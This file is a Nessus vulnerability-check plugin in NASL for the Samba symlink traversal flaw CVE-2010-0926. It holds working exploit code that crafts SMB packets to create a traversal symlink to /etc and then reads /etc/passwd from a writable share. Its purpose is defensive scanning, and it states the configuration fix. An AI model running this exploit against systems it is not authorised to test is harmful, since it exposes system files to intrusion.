#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44406);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/11/17 15:28:26 $");

  script_bugtraq_id(38111);
  script_cve_id("CVE-2010-0926");
  script_osvdb_id(62145);
  script_xref(name:"Secunia", value:"38454");

  script_name(english:"Samba Symlink Traversal Arbitrary File Access (unsafe check)");
  script_summary(english:"Attempts to grab /etc/passwd");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote file server is prone to a symlink attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote Samba server is configured insecurely and allows a remote
attacker to gain read or possibly write access to arbitrary files on
the affected host.  Specifically, if an attacker has a valid Samba
account for a share that is writable or there is a writable share that
is configured to be a guest account share, he can create a symlink
using directory traversal sequences and gain access to files and
directories outside that share. 

Note that successful exploitation requires that the Samba server's
'wide links' parameter be set to 'yes', which is the default."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/fulldisclosure/2010/Feb/99"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.youtube.com/watch?v=NN50RtZ2N74"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.samba.org/samba/news/symlink_attack.html"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Set 'wide links = no' in the [global] section of smbd.conf."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date",value:"2010/02/04");
  script_set_attribute(attribute:"plugin_publication_date",value:"2010/02/08");

  script_set_attribute(attribute:"plugin_type", value:"local");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:samba:samba");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("smb_accessible_shares.nasl");
  script_require_ports(139, 445);
  script_require_keys("SMB/samba");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("smb_func.inc");
include("byte_func.inc");


SET_PATH_INFO = 0x06;
SET_FILE_UNIX_LINK = 0x0201;


# taken from smb_kb917159.nasl
function smb_get_error_code(data)
{
  local_var header, flags2, code;

  # Some checks in the header first
  header = get_smb_header (smbblob:data);
  if (!header)
    return NULL;

  flags2 = get_header_flags2 (header:header);
  if (flags2 & SMB_FLAGS2_32BIT_STATUS)
  {
    code = get_header_nt_error_code (header:header);
  }
  else
  {
    code = get_header_dos_error_code (header:header);
  }

  return code;
}

function create_symlink(source, target)
{
  local_var header, link_src, link_target, link_param, link_data, data, params;
  local_var smb_params, smb_data, nb_pkt, ret;

  if (isnull(source))
  {
    err_print('create_symlink(): missing required argument "source".');
    return NULL;
  }
  if (isnull(target))
  {
    err_print('create_symlink(): missing required argument "target".');
    return NULL;
  }

  header = smb_header(Command:SMB_COM_TRANSACTION2,
                      Status:nt_status (Status: STATUS_SUCCESS));

  link_param = raw_word(w:SET_FILE_UNIX_LINK) + # level of interest
               raw_dword(d:0) + # reserved
               unicode(string:target) + mkword(0);
  link_data = unicode(string:source) + mkword(0);
  data = link_param + link_data;

  params = raw_word(w:strlen(link_param)) +  # param len
           raw_word(w:strlen(link_data)) +   # data len
           raw_word(w:2) +      # parameter count
           raw_word(w:0xffff) + # max data count
           raw_byte(b:0) +      # max setup count
           raw_byte(b:0) +      # reserved
           raw_word(w:0) +      # flags
           raw_dword(d:0) +     # timeout (return immediately)
           raw_word(w:0) +      # reserved
           raw_word(w:strlen(link_param)) +     # param len
           raw_word(w:68) +     # parameter offset
           raw_word(w:strlen(link_data)) +     # data len
           raw_word(w:68+strlen(link_param)) + # data offset
           raw_byte(b:1) +  # setup count
           raw_byte(b:0) +  # reserved
           raw_word(w:SET_PATH_INFO); # subcommand
  
  smb_params = smb_parameters(data:params);
  smb_data = smb_data(data:mkbyte(0)+mkword(0)+data);
  nb_pkt = netbios_packet(header:header, parameters:smb_params, data:smb_data);
  ret = smb_sendrecv (data:nb_pkt);

  if (!ret)
    return NULL;

  return smb_get_error_code(data:ret);
}


#
# execution begins here
#

axx_shares = get_kb_item("SMB/accessible_shares/1");
axx_shares = split(axx_shares, sep:'\n', keep:FALSE);
share = NULL;

# we need to know at least one writable share in order to test for this
foreach line (axx_shares)
{
  match = eregmatch(string:line, pattern:'^- (.+)  - \\((.+)\\)$');
  if (match)
  {
    if ('writable' >< match[2])
    {
      share = match[1];
      break;
    }
    else
      debug_print('Share "'+share+'" is not writable.');
  }
  else err_print("Error parsing accessible share data.");
}

if (isnull(share))
  exit(0, 'No writable shares were enumerated on the remote host.');

name    =  kb_smb_name();
port    =  kb_smb_transport();
if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");
login   =  kb_smb_login();
pass    =  kb_smb_password();
domain  =  kb_smb_domain();

soc = open_sock_tcp(port);
if (!soc) exit(1, "Failed to open a socket on port "+port+".");

session_init(socket:soc, hostname:name);
rc = NetUseAdd(login:login, password:pass, domain:domain, share:share);
if (rc != 1)
{
  NetUseDel();
  exit(1, "Can't connect to '"+share+"' share.");
}

# attempt to create a symlink using a directory traversal
link_name = SCRIPT_NAME+'-'+unixtime();
ret = create_symlink(
  source:'../../../../../../../../../../etc',
  target:link_name
);

if (ret != STATUS_SUCCESS)
{
  NetUseDel();
  exit(0, "The host is not affected.");
}

# If the dir traversal worked, we should be able to read the passwd file
file = link_name+'\\passwd';

fh = CreateFile(
  file:file,
  desired_access:GENERIC_READ,
  file_attributes:FILE_ATTRIBUTE_NORMAL,
  share_mode:FILE_SHARE_READ,
  create_disposition:OPEN_EXISTING
);

# grab the contents of the passwd file
passwd = '';
if (fh)
{
  len = 1024;
  idx = 0;

  repeat
  {
    data = ReadFile(handle:fh, length:len, offset:idx);
    passwd += data;
    idx += strlen(data);
  } until (strlen(data) < len);

  CloseFile(handle:fh);
}

NetUseDel();

if (strlen(passwd) > 0)
{
  if (report_verbosity > 0)
  {
    report = '\nNessus was able to read the contents of /etc/passwd :\n\n'+
             crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n'+
             passwd+'\n'+
             crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else exit(1, 'Unable to read "'+file+'" from share "'+share+'".');
